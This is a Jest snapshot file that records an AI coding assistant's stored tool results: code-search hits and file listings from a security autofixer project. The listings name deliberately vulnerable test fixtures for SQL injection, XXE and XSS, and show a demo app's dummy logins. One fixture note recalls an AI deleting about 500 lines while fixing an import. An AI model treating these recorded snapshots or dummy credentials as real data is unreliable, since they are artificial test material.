collections_abc\\",\\"lineNumber\\":13},{\\"text\\":\\"- **File**: \`containers.py\`\\",\\"lineNumber\\":14},{\\"text\\":\\"- **Description**: Wildcard imports from \`collections\` and abstract base classes\\",\\"lineNumber\\":15},{\\"text\\":\\"- **Patterns**: \\",\\"lineNumber\\":16},{\\"text\\":\\"  - \`from collections import *\`\\",\\"lineNumber\\":17},{\\"text\\":\\"  - \`from collections.abc import *\`\\",\\"lineNumber\\":18},{\\"text\\":\\"  - \`from abc import *\`\\",\\"lineNumber\\":19},{\\"text\\":\\"- **Usage**: Container types, abstract base classes, decorators\\",\\"lineNumber\\":20},{\\"lineNumber\\":21},{\\"text\\":\\"### 3. datetime_time\\",\\"lineNumber\\":22},{\\"text\\":\\"- **File**: \`scheduler.py\`\\",\\"lineNumber\\":23},{\\"text\\":\\"- **Description**: Time and date manipulation with multiple wildcard imports\\",\\"lineNumber\\":24},{\\"text\\":\\"- **Patterns**:\\",\\"lineNumber\\":25},{\\"text\\":\\"  - \`from datetime import *\`\\",\\"lineNumber\\":26},{\\"text\\":\\"  - \`from time import *\`\\",\\"lineNumber\\":27},{\\"text\\":\\"  - \`from calendar import *\`\\",\\"lineNumber\\":28},{\\"text\\":\\"- **Usage**: Scheduling, time zones, calendar operations\\",\\"lineNumber\\":29},{\\"lineNumber\\":30},{\\"text\\":\\"### 4. fabric_deployment\\",\\"lineNumber\\":31},{\\"text\\":\\"- **File**: \`deploy.py\`\\",\\"lineNumber\\":32},{\\"text\\":\\"- **Description**: Real-world deployment script using Fabric with extensive functionality\\",\\"lineNumber\\":33},{\\"text\\":\\"- **Pattern**: \`from fabric.api import *\`\\",\\"lineNumber\\":34},{\\"text\\":\\"- **Usage**: Server deployment automation with 400+ lines of deployment logic\\",\\"lineNumber\\":35},{\\"text\\":\\"- **Special Note**: This mimics the real-world issue where AI removed ~500 lines of code after fixing the import\\",\\"lineNumber\\":36},{\\"lineNumber\\":37},{\\"text\\":\\"### 5. local_package\\",\\"lineNumber\\":38},{\\"text\\":\\"- **Files**: \`main.py\`, \`utils.py\`, \`helpers.py\`\\",\\"lineNumber\\":39},{\\"text\\":\\"- **Description**: Wildcard imports from local modules in the same package\\",\\"lineNumber\\":40},{\\"text\\":\\"- **Patterns**:\\",\\"lineNumber\\":41},{\\"text\\":\\"  - \`from utils import *\`\\",\\"lineNumber\\":42},{\\"text\\":\\"  - \`from helpers import *\`\\",\\"lineNumber\\":43},{\\"text\\":\\"- **Usage**: Application using various utilities and helper functions from local modules\\",\\"lineNumber\\":44},{\\"lineNumber\\":45},{\\"text\\":\\"### 6. mixed_imports\\",\\"lineNumber\\":46},{\\"text\\":\\"- **File**: \`hybrid_imports.py\`\\",\\"lineNumber\\":47},{\\"text\\":\\"- **Description**: Mixing wildcard imports with explicit imports\\",\\"lineNumber\\":48},{\\"text\\":\\"- **Patterns**:\\",\\"lineNumber\\":49},{\\"text\\":\\"  - Explicit: \`from collections import Counter, defaultdict\`\\",\\"lineNumber\\":50}]},\\"score\\":0.2711057662963867},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"consumers/analyzer/tests/assets/java/sqli/e-1578/source/README.md\\",\\"range\\":{\\"startPosition\\":{},\\"endPosition\\":{\\"line\\":68}},\\"contents\\":\\"# My Demo Bank App\\\\n\\\\nA modern, feature-rich demo banking application built with Spring Boot for learning and demonstration purposes.\\\\n\\\\n## Overview\\\\n\\\\nMy Demo Bank App is a comprehensive web application that showcases banking functionality in a clean, professional interface. It demonstrates modern web development practices and provides a realistic banking experience for educational and portfolio purposes.\\\\n\\\\n## 🎯 Purpose\\\\n\\\\nThis application is designed for:\\\\n- Learning web development with Spring Boot\\\\n- Demonstrating banking application features\\\\n- Portfolio demonstration\\\\n- Educational purposes\\\\n- Understanding database interactions\\\\n\\\\n## 🛠️ Features\\\\n\\\\n### Core Banking Functionality\\\\n- **User Authentication** - Secure login system\\\\n- **Account Management** - Multiple account types (checking, savings, investment)\\\\n- **Money Transfers** - Transfer funds between accounts\\\\n- **Credit Card Applications** - Apply for various credit card products\\\\n- **Application Search** - Search through credit applications\\\\n- **Dashboard** - Comprehensive overview of accounts and activities\\\\n\\\\n### Technical Features\\\\n- **Spring Boot** - Modern Java web framework\\\\n- **H2 Database** - In-memory database for easy setup\\\\n- **Thymeleaf** - Server-side templating\\\\n- **Responsive Design** - Works on all device sizes\\\\n- **Professional UI** - Clean, modern interface\\\\n\\\\n## 🚀 Quick Start\\\\n\\\\n### Prerequisites\\\\n- Java 17 or higher\\\\n- Maven 3.6 or higher\\\\n\\\\n### Running the Application\\\\n\\\\n1. **Clone the repository**\\\\n   \`\`\`bash\\\\n   git clone <repository-url>\\\\n   cd my-demo-bank-app\\\\n   \`\`\`\\\\n\\\\n2. **Build the application**\\\\n   \`\`\`bash\\\\n   mvn clean install\\\\n   \`\`\`\\\\n\\\\n3. **Run the application**\\\\n   \`\`\`bash\\\\n   mvn spring-boot:run\\\\n   \`\`\`\\\\n\\\\n4. **Access the application**\\\\n   - Open your browser and go to: \`http://localhost:8080\`\\\\n   - Use the demo accounts provided on the login page\\\\n\\\\n### Demo Accounts\\\\n\\\\n| Username | Password | Description |\\\\n|----------|----------|-------------|\\\\n| alice | password123 | Customer with multiple accounts |\\\\n\\",\\"originalContents\\":\\"# My Demo Bank App\\\\n\\\\nA modern, feature-rich demo banking application built with Spring Boot for learning and demonstration purposes.\\\\n\\\\n## Overview\\\\n\\\\nMy Demo Bank App is a comprehensive web application that showcases banking functionality in a clean, professional interface. It demonstrates modern web development practices and provides a realistic banking experience for educational and portfolio purposes.\\\\n\\\\n## 🎯 Purpose\\\\n\\\\nThis application is designed for:\\\\n- Learning web development with Spring Boot\\\\n- Demonstrating banking application features\\\\n- Portfolio demonstration\\\\n- Educational purposes\\\\n- Understanding database interactions\\\\n\\\\n## 🛠️ Features\\\\n\\\\n### Core Banking Functionality\\\\n- **User Authentication** - Secure login system\\\\n- **Account Management** - Multiple account types (checking, savings, investment)\\\\n- **Money Transfers** - Transfer funds between accounts\\\\n- **Credit Card Applications** - Apply for various credit card products\\\\n- **Application Search** - Search through credit applications\\\\n- **Dashboard** - Comprehensive overview of accounts and activities\\\\n\\\\n### Technical Features\\\\n- **Spring Boot** - Modern Java web framework\\\\n- **H2 Database** - In-memory database for easy setup\\\\n- **Thymeleaf** - Server-side templating\\\\n- **Responsive Design** - Works on all device sizes\\\\n- **Professional UI** - Clean, modern interface\\\\n\\\\n## 🚀 Quick Start\\\\n\\\\n### Prerequisites\\\\n- Java 17 or higher\\\\n- Maven 3.6 or higher\\\\n\\\\n### Running the Application\\\\n\\\\n1. **Clone the repository**\\\\n   \`\`\`bash\\\\n   git clone <repository-url>\\\\n   cd my-demo-bank-app\\\\n   \`\`\`\\\\n\\\\n2. **Build the application**\\\\n   \`\`\`bash\\\\n   mvn clean install\\\\n   \`\`\`\\\\n\\\\n3. **Run the application**\\\\n   \`\`\`bash\\\\n   mvn spring-boot:run\\\\n   \`\`\`\\\\n\\\\n4. **Access the application**\\\\n   - Open your browser and go to: \`http://localhost:8080\`\\\\n   - Use the demo accounts provided on the login page\\\\n\\\\n### Demo Accounts\\\\n\\\\n| Username | Password | Description |\\\\n|----------|----------|-------------|\\\\n| alice | password123 | Customer with multiple accounts |\\\\n\\",\\"detailedLines\\":[{\\"text\\":\\"# My Demo Bank App\\",\\"lineNumber\\":1},{\\"lineNumber\\":2},{\\"text\\":\\"A modern, feature-rich demo banking application built with Spring Boot for learning and demonstration purposes.\\",\\"lineNumber\\":3},{\\"lineNumber\\":4},{\\"text\\":\\"## Overview\\",\\"lineNumber\\":5},{\\"lineNumber\\":6},{\\"text\\":\\"My Demo Bank App is a comprehensive web application that showcases banking functionality in a clean, professional interface. It demonstrates modern web development practices and provides a realistic banking experience for educational and portfolio purposes.\\",\\"lineNumber\\":7},{\\"lineNumber\\":8},{\\"text\\":\\"## 🎯 Purpose\\",\\"lineNumber\\":9},{\\"lineNumber\\":10},{\\"text\\":\\"This application is designed for:\\",\\"lineNumber\\":11},{\\"text\\":\\"- Learning web development with Spring Boot\\",\\"lineNumber\\":12},{\\"text\\":\\"- Demonstrating banking application features\\",\\"lineNumber\\":13},{\\"text\\":\\"- Portfolio demonstration\\",\\"lineNumber\\":14},{\\"text\\":\\"- Educational purposes\\",\\"lineNumber\\":15},{\\"text\\":\\"- Understanding database interactions\\",\\"lineNumber\\":16},{\\"lineNumber\\":17},{\\"text\\":\\"## 🛠️ Features\\",\\"lineNumber\\":18},{\\"lineNumber\\":19},{\\"text\\":\\"### Core Banking Functionality\\",\\"lineNumber\\":20},{\\"text\\":\\"- **User Authentication** - Secure login system\\",\\"lineNumber\\":21},{\\"text\\":\\"- **Account Management** - Multiple account types (checking, savings, investment)\\",\\"lineNumber\\":22},{\\"text\\":\\"- **Money Transfers** - Transfer funds between accounts\\",\\"lineNumber\\":23},{\\"text\\":\\"- **Credit Card Applications** - Apply for various credit card products\\",\\"lineNumber\\":24},{\\"text\\":\\"- **Application Search** - Search through credit applications\\",\\"lineNumber\\":25},{\\"text\\":\\"- **Dashboard** - Comprehensive overview of accounts and activities\\",\\"lineNumber\\":26},{\\"lineNumber\\":27},{\\"text\\":\\"### Technical Features\\",\\"lineNumber\\":28},{\\"text\\":\\"- **Spring Boot** - Modern Java web framework\\",\\"lineNumber\\":29},{\\"text\\":\\"- **H2 Database** - In-memory database for easy setup\\",\\"lineNumber\\":30},{\\"text\\":\\"- **Thymeleaf** - Server-side templating\\",\\"lineNumber\\":31},{\\"text\\":\\"- **Responsive Design** - Works on all device sizes\\",\\"lineNumber\\":32},{\\"text\\":\\"- **Professional UI** - Clean, modern interface\\",\\"lineNumber\\":33},{\\"lineNumber\\":34},{\\"text\\":\\"## 🚀 Quick Start\\",\\"lineNumber\\":35},{\\"lineNumber\\":36},{\\"text\\":\\"### Prerequisites\\",\\"lineNumber\\":37},{\\"text\\":\\"- Java 17 or higher\\",\\"lineNumber\\":38},{\\"text\\":\\"- Maven 3.6 or higher\\",\\"lineNumber\\":39},{\\"lineNumber\\":40},{\\"text\\":\\"### Running the Application\\",\\"lineNumber\\":41},{\\"lineNumber\\":42},{\\"text\\":\\"1. **Clone the repository**\\",\\"lineNumber\\":43},{\\"text\\":\\"   \`\`\`bash\\",\\"lineNumber\\":44},{\\"text\\":\\"   git clone <repository-url>\\",\\"lineNumber\\":45},{\\"text\\":\\"   cd my-demo-bank-app\\",\\"lineNumber\\":46},{\\"text\\":\\"   \`\`\`\\",\\"lineNumber\\":47},{\\"lineNumber\\":48},{\\"text\\":\\"2. **Build the application**\\",\\"lineNumber\\":49},{\\"text\\":\\"   \`\`\`bash\\",\\"lineNumber\\":50},{\\"text\\":\\"   mvn clean install\\",\\"lineNumber\\":51},{\\"text\\":\\"   \`\`\`\\",\\"lineNumber\\":52},{\\"lineNumber\\":53},{\\"text\\":\\"3. **Run the application**\\",\\"lineNumber\\":54},{\\"text\\":\\"   \`\`\`bash\\",\\"lineNumber\\":55},{\\"text\\":\\"   mvn spring-boot:run\\",\\"lineNumber\\":56},{\\"text\\":\\"   \`\`\`\\",\\"lineNumber\\":57},{\\"lineNumber\\":58},{\\"text\\":\\"4. **Access the application**\\",\\"lineNumber\\":59},{\\"text\\":\\"   - Open your browser and go to: \`http://localhost:8080\`\\",\\"lineNumber\\":60},{\\"text\\":\\"   - Use the demo accounts provided on the login page\\",\\"lineNumber\\":61},{\\"lineNumber\\":62},{\\"text\\":\\"### Demo Accounts\\",\\"lineNumber\\":63},{\\"lineNumber\\":64},{\\"text\\":\\"| Username | Password | Description |\\",\\"lineNumber\\":65},{\\"text\\":\\"|----------|----------|-------------|\\",\\"lineNumber\\":66},{\\"text\\":\\"| alice | password123 | Customer with multiple accounts |\\",\\"lineNumber\\":67},{\\"text\\":\\"| bob | pass456 | Customer with basic accounts |\\",\\"lineNumber\\":68}]},\\"score\\":0.2711007595062256},{\\"codeBlock\\":{\\"relativeWorkspacePath\\":\\"pycommon/tests/conftest.py\\",\\"range\\":{\\"startPosition\\":{},\\"endPosition\\":{\\"line\\":73}},\\"contents\\":\\"import os\\\\nimport pathlib\\\\n\\\\nimport pytest\\\\nfrom aioresponses import aioresponses\\\\n\\\\nROOT_REPO_DIR = pathlib.Path(__file__).parent.parent.parent\\\\nWEBGOAT_CHECKMARX_TEST_REPORT_PATH = (\\\\n    ROOT_REPO_DIR\\\\n    / \\\\\\"services/node_general_backend/src/maintenance/try_now/webgoat/checkmarx.json\\\\\\"\\\\n)\\\\nWEBGOAT_CHECKMARX_TEST_REPO_ZIP_PATH = (\\\\n    ROOT_REPO_DIR\\\\n    / \\\\\\"services/node_general_backend/src/maintenance/try_now/webgoat/repo.zip\\\\\\"\\\\n)\\\\nJUICE_SHOP_SNYK_TEST_REPORT_PATH = (\\\\n    ROOT_REPO_DIR\\\\n    / \\\\\\"services/node_general_backend/src/maintenance/try_now/juice-shop/snyk.json\\\\\\"\\\\n)\\\\nJUICE_SHOP_SNYK_TEST_REPO_ZIP_PATH = (\\\\n    ROOT_REPO_DIR\\\\n    / \\\\\\"services/node_general_backend/src/maintenance/try_now/juice-shop/repo.zip\\\\\\"\\\\n)\\\\nTESTS_DIR = pathlib.Path(__file__).parent\\\\n\\\\nTEST_DATA_SOURCE = TESTS_DIR.parent.parent / \\\\\\"__tests__/files\\\\\\"\\\\nTEST_DATA_WEBGOAT = TEST_DATA_SOURCE / \\\\\\"webgoat\\\\\\"\\\\nREPO1_CODE_ZIP_PATH = TEST_DATA_SOURCE / \\\\\\"repo.zip\\\\\\"\\\\nREPO1_VUL_REPORT = TEST_DATA_SOURCE / \\\\\\"altoroj.json\\\\\\"\\\\nREPO1_VUL_REPORT_SONAR = TEST_DATA_SOURCE / \\\\\\"altoroj/sonarqube.json\\\\\\"\\\\nREPO1_ORIGINAL_URL = \\\\\\"https://github.com/HCL-TECH-SOFTWARE/AltoroJ\\\\\\"\\\\nASSETS_DIR = TESTS_DIR / \\\\\\"assets\\\\\\"\\\\nBUGSY_SOURCE = TESTS_DIR.parent.parent / \\\\\\"clients/cli\\\\\\"\\\\n\\\\nSAMPLE_JAVA_FILE = TESTS_DIR / \\\\\\"assets/sample.java\\\\\\"\\\\nSAMPLE_JSP_FILE = TESTS_DIR / \\\\\\"assets/sample.jsp\\\\\\"\\\\n\\\\n\\\\n@pytest.fixture\\\\ndef aiohttp_session():\\\\n    with aioresponses() as session:\\\\n        yield session\\",\\"originalContents\\":\\"import os\\\\nimport pathlib\\\\n\\\\nimport pytest\\\\nfrom aioresponses import aioresponses\\\\n\\\\nROOT_REPO_DIR = pathlib.Path(__file__).parent.parent.parent\\\\nWEBGOAT_CHECKMARX_TEST_REPORT_PATH = (\\\\n    ROOT_REPO_DIR\\\\n    / \\\\\\"services/node_general_backend/src/maintenance/try_now/webgoat/checkmarx.json\\\\\\"\\\\n)\\\\nWEBGOAT_CHECKMARX_TEST_REPO_ZIP_PATH = (\\\\n    ROOT_REPO_DIR\\\\n    / \\\\\\"services/node_general_backend/src/maintenance/try_now/webgoat/repo.zip\\\\\\"\\\\n)\\\\nJUICE_SHOP_SNYK_TEST_REPORT_PATH = (\\\\n    ROOT_REPO_DIR\\\\n    / \\\\\\"services/node_general_backend/src/maintenance/try_now/juice-shop/snyk.json\\\\\\"\\\\n)\\\\nJUICE_SHOP_SNYK_TEST_REPO_ZIP_PATH = (\\\\n    ROOT_REPO_DIR\\\\n    / \\\\\\"services/node_general_backend/src/maintenance/try_now/juice-shop/repo.zip\\\\\\"\\\\n)\\\\nTESTS_DIR = pathlib.Path(__file__).parent\\\\n\\\\nTEST_DATA_SOURCE = TESTS_DIR.parent.parent / \\\\\\"__tests__/files\\\\\\"\\\\nTEST_DATA_WEBGOAT = TEST_DATA_SOURCE / \\\\\\"webgoat\\\\\\"\\\\nREPO1_CODE_ZIP_PATH = TEST_DATA_SOURCE / \\\\\\"repo.zip\\\\\\"\\\\nREPO1_VUL_REPORT = TEST_DATA_SOURCE / \\\\\\"altoroj.json\\\\\\"\\\\nREPO1_VUL_REPORT_SONAR = TEST_DATA_SOURCE / \\\\\\"altoroj/sonarqube.json\\\\\\"\\\\nREPO1_ORIGINAL_URL = \\\\\\"https://github.com/HCL-TECH-SOFTWARE/AltoroJ\\\\\\"\\\\nASSETS_DIR = TESTS_DIR / \\\\\\"assets\\\\\\"\\\\nBUGSY_SOURCE = TESTS_DIR.parent.parent / \\\\\\"clients/cli\\\\\\"\\\\n\\\\nSAMPLE_JAVA_FILE = TESTS_DIR / \\\\\\"assets/sample.java\\\\\\"\\\\nSAMPLE_JSP_FILE = TESTS_DIR / \\\\\\"assets/sample.jsp\\\\\\"\\\\n\\\\n\\\\n@pytest.fixture\\\\ndef aiohttp_session():\\\\n    with aioresponses() as session:\\\\n        yield session\\",\\"detailedLines\\":[{\\"text\\":\\"import os\\",\\"lineNumber\\":1},{\\"text\\":\\"import pathlib\\",\\"lineNumber\\":2},{\\"lineNumber\\":3},{\\"text\\":\\"import pytest\\",\\"lineNumber\\":4},{\\"text\\":\\"from aioresponses import aioresponses\\",\\"lineNumber\\":5},{\\"lineNumber\\":6},{\\"text\\":\\"ROOT_REPO_DIR = pathlib.Path(__file__).parent.parent.parent\\",\\"lineNumber\\":7},{\\"text\\":\\"WEBGOAT_CHECKMARX_TEST_REPORT_PATH = (\\",\\"lineNumber\\":8},{\\"text\\":\\"    ROOT_REPO_DIR\\",\\"lineNumber\\":9},{\\"text\\":\\"    / \\\\\\"services/node_general_backend/src/maintenance/try_now/webgoat/checkmarx.json\\\\\\"\\",\\"lineNumber\\":10},{\\"text\\":\\")\\",\\"lineNumber\\":11},{\\"text\\":\\"WEBGOAT_CHECKMARX_TEST_REPO_ZIP_PATH = (\\",\\"lineNumber\\":12},{\\"text\\":\\"    ROOT_REPO_DIR\\",\\"lineNumber\\":13},{\\"text\\":\\"    / \\\\\\"services/node_general_backend/src/maintenance/try_now/webgoat/repo.zip\\\\\\"\\",\\"lineNumber\\":14},{\\"text\\":\\")\\",\\"lineNumber\\":15},{\\"text\\":\\"JUICE_SHOP_SNYK_TEST_REPORT_PATH = (\\",\\"lineNumber\\":16},{\\"text\\":\\"    ROOT_REPO_DIR\\",\\"lineNumber\\":17},{\\"text\\":\\"    / \\\\\\"services/node_general_backend/src/maintenance/try_now/juice-shop/snyk.json\\\\\\"\\",\\"lineNumber\\":18},{\\"text\\":\\")\\",\\"lineNumber\\":19},{\\"text\\":\\"JUICE_SHOP_SNYK_TEST_REPO_ZIP_PATH = (\\",\\"lineNumber\\":20},{\\"text\\":\\"    ROOT_REPO_DIR\\",\\"lineNumber\\":21},{\\"text\\":\\"    / \\\\\\"services/node_general_backend/src/maintenance/try_now/juice-shop/repo.zip\\\\\\"\\",\\"lineNumber\\":22},{\\"text\\":\\")\\",\\"lineNumber\\":23},{\\"text\\":\\"TESTS_DIR = pathlib.Path(__file__).parent\\",\\"lineNumber\\":24},{\\"lineNumber\\":25},{\\"text\\":\\"TEST_DATA_SOURCE = TESTS_DIR.parent.parent / \\\\\\"__tests__/files\\\\\\"\\",\\"lineNumber\\":26},{\\"text\\":\\"TEST_DATA_WEBGOAT = TEST_DATA_SOURCE / \\\\\\"webgoat\\\\\\"\\",\\"lineNumber\\":27},{\\"text\\":\\"REPO1_CODE_ZIP_PATH = TEST_DATA_SOURCE / \\\\\\"repo.zip\\\\\\"\\",\\"lineNumber\\":28},{\\"text\\":\\"REPO1_VUL_REPORT = TEST_DATA_SOURCE / \\\\\\"altoroj.json\\\\\\"\\",\\"lineNumber\\":29},{\\"text\\":\\"REPO1_VUL_REPORT_SONAR = TEST_DATA_SOURCE / \\\\\\"altoroj/sonarqube.json\\\\\\"\\",\\"lineNumber\\":30},{\\"text\\":\\"REPO1_ORIGINAL_URL = \\\\\\"https://github.com/HCL-TECH-SOFTWARE/AltoroJ\\\\\\"\\",\\"lineNumber\\":31},{\\"text\\":\\"ASSETS_DIR = TESTS_DIR / \\\\\\"assets\\\\\\"\\",\\"lineNumber\\":32},{\\"text\\":\\"BUGSY_SOURCE = TESTS_DIR.parent.parent / \\\\\\"clients/cli\\\\\\"\\",\\"lineNumber\\":33},{\\"lineNumber\\":34},{\\"text\\":\\"SAMPLE_JAVA_FILE = TESTS_DIR / \\\\\\"assets/sample.java\\\\\\"\\",\\"lineNumber\\":35},{\\"text\\":\\"SAMPLE_JSP_FILE = TESTS_DIR / \\\\\\"assets/sample.jsp\\\\\\"\\",\\"lineNumber\\":36},{\\"lineNumber\\":37},{\\"lineNumber\\":38},{\\"text\\":\\"@pytest.fixture\\",\\"lineNumber\\":39},{\\"text\\":\\"def aiohttp_session():\\",\\"lineNumber\\":40,\\"isSignature\\":true},{\\"text\\":\\"    with aioresponses() as session:\\",\\"lineNumber\\":41},{\\"text\\":\\"        yield session\\",\\"lineNumber\\":42,\\"isSignature\\":true},{\\"lineNumber\\":43},{\\"lineNumber\\":44},{\\"text\\":\\"@pytest.fixture(autouse=True, scope=\\\\\\"session\\\\\\")\\",\\"lineNumber\\":45},{\\"text\\":\\"def mock_env_values_for_py_common():\\",\\"lineNumber\\":46,\\"isSignature\\":true},{\\"text\\":\\"    os.environ[\\\\\\"AWS_S3_ACCESS_KEY_ID\\\\\\"] = \\\\\\"DUMMY_AWS_S3_ACCESS_KEY_ID\\\\\\"\\",\\"lineNumber\\":47}]},\\"score\\":0.2702752351760864}]}"}}",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-result-33 1`] = `
[
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:aec14c07-95b1-4f2a-bb8e-733459f9abfd",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"aec14c07-95b1-4f2a-bb8e-733459f9abfd","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-10-29T16:47:51.735Z","isQuickSearchQuery":false,"codeBlocks":[],"text":"","capabilityType":15,"toolFormerData":{"tool":42,"toolCallId":"tool_1c158746-e457-4323-ae87-794dcb2bf02","toolIndex":2,"modelCallId":"94bee8e6-f0f3-4364-9f67-98e8c95a58ae","status":"completed","rawArgs":"{\\"glob_pattern\\": \\"*sample*\\"}","name":"glob_file_search","params":"{\\"globPattern\\":\\"**/*sample*\\"}","additionalData":{},"result":"{\\"directories\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer\\",\\"files\\":[{\\"relPath\\":\\"patchino/patchino/sampler.py\\"},{\\"relPath\\":\\"patchino/ai-playground/src/screens/Sampler.tsx\\"},{\\"relPath\\":\\"pycommon/tests/assets/sample_semgrep_report.json\\"},{\\"relPath\\":\\"pycommon/tests/assets/sample_datadog_report.json\\"},{\\"relPath\\":\\"patchino/example_sampler_config.json\\"},{\\"relPath\\":\\"patchino/patchino/backend/mutations/run_sampler.py\\"},{\\"relPath\\":\\"clients/cli/__tests__/mcp/mocks/sample.gitignore\\"},{\\"relPath\\":\\"patchino/_samples/samples.json\\"},{\\"relPath\\":\\"pycommon/tests/assets/sample.jsp\\"},{\\"relPath\\":\\"pycommon/tests/assets/sample.java\\"},{\\"relPath\\":\\"consumers/report_init/tests/files/sample-repo.zip\\"}],\\"totalFiles\\":11}]}"}}",
  },
]
`;

exports[`extension tests > 'full database scenario without thinki…' > full-state.vscdb-getRowsByLike-result-34 1`] = `
[
  {
    "key": "bubbleId:b777ffa2-b1cc-4064-a0a1-6bb58e24ad53:462589a9-1a94-4ca1-956b-232feb5eb4d3",
    "value": "{"_v":3,"type":2,"approximateLintErrors":[],"lints":[],"codebaseContextChunks":[],"commits":[],"pullRequests":[],"attachedCodeChunks":[],"assistantSuggestedDiffs":[],"gitDiffs":[],"interpreterResults":[],"images":[],"attachedFolders":[],"attachedFoldersNew":[],"bubbleId":"462589a9-1a94-4ca1-956b-232feb5eb4d3","userResponsesToSuggestedCodeBlocks":[],"suggestedCodeBlocks":[],"diffsForCompressingFiles":[],"relevantFiles":[],"toolResults":[],"notepads":[],"capabilities":[],"capabilityStatuses":{"mutate-request":[],"start-submit-chat":[],"before-submit-chat":[],"chat-stream-finished":[],"before-apply":[],"after-apply":[],"accept-all-edits":[],"composer-done":[],"process-stream":[],"add-pending-action":[]},"multiFileLinterErrors":[],"diffHistories":[],"recentLocationsHistory":[],"recentlyViewedFiles":[],"isAgentic":false,"fileDiffTrajectories":[],"existedSubsequentTerminalCommand":false,"existedPreviousTerminalCommand":false,"docsReferences":[],"webReferences":[],"aiWebSearchResults":[],"requestId":"","attachedFoldersListDirResults":[],"humanChanges":[],"attachedHumanChanges":false,"summarizedComposers":[],"cursorRules":[],"contextPieces":[],"editTrailContexts":[],"allThinkingBlocks":[],"diffsSinceLastApply":[],"deletedFiles":[],"supportedTools":[],"tokenCount":{"inputTokens":0,"outputTokens":0},"attachedFileCodeChunksMetadataOnly":[],"consoleLogs":[],"uiElementPicked":[],"isRefunded":false,"knowledgeItems":[],"documentationSelections":[],"externalLinks":[],"useWeb":false,"projectLayouts":[],"unifiedMode":2,"capabilityContexts":[],"todos":[],"createdAt":"2025-10-29T16:47:51.772Z","isQuickSearchQuery":false,"codeBlocks":[],"text":"","capabilityType":15,"toolFormerData":{"tool":42,"toolCallId":"tool_bd115ef8-eaa8-4253-9e69-9a8114b6a29","toolIndex":3,"modelCallId":"94bee8e6-f0f3-4364-9f67-98e8c95a58ae","status":"completed","rawArgs":"{\\"glob_pattern\\": \\"*example*\\"}","name":"glob_file_search","params":"{\\"globPattern\\":\\"**/*example*\\"}","additionalData":{},"result":"{\\"directories\\":[{\\"absPath\\":\\"/Users/jonathanafek/src/autofixer\\",\\"files\\":[{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/sqli/statement_in_class_def/source/src/main/java/SQLInjectionExample.java\\"},{\\"relPath\\":\\"patchino/example_sampler_config.json\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/xxe/e-1391/LLM_Type_Guess/source/src/main/java/JaxbExampleFruitUnmarshalHttpResponse.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/xxe/e-1391/LLM_Type_Guess/source/src/main/java/JaxbExampleFruitUnmarshalDTDFalseInputFactory.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/xxe/e-1391/LLM_Type_Guess/source/src/main/java/JaxbExampleFruitMarshal.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/xxe/e-1391/JAXB_Unmarshaller/source/src/main/java/JaxbExampleFruitUnmarshalFile.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/xxe/e-1391/JAXB_Unmarshaller/source/src/main/java/JaxbExampleFruitUnmarshalDTDFalseInputFactory.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/xxe/e-1391/JAXB_Unmarshaller/source/src/main/java/JaxbExampleFruitMarshal.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/python/modified_default_param/basic/source/fp_example.py\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/python/modified_default_param/basic/source/example.py\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/python/modified_default_param/basic/source/class_example.py\\"},{\\"relPath\\":\\"clients/cli/__tests__/assets/github_fixer_demo/irrelevant_vendor_code/repo/vendor/xss-example.js\\"},{\\"relPath\\":\\"clients/cli/__tests__/assets/github_fixer_demo/irrelevant_test_code/repo/test/xss-example.js\\"},{\\"relPath\\":\\"clients/cli/__tests__/assets/github_fixer_demo/irrelevant_auxiliary_code/repo/scripts/xss-example.js\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/xxe/e-1231/JAXB_Unmarshaller_old_java/source/src/main/java/JaxbExampleFruitUnmarshalSource.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/xxe/e-1231/JAXB_Unmarshaller_old_java/source/src/main/java/JaxbExampleFruitUnmarshalFile.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/xxe/e-1231/JAXB_Unmarshaller_old_java/source/src/main/java/JaxbExampleFruitUnmarshalDTDFalseInputFactory.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/assets/java/xxe/e-1231/JAXB_Unmarshaller_old_java/source/src/main/java/JaxbExampleFruitMarshal.java\\"},{\\"relPath\\":\\"consumers/analyzer/tests/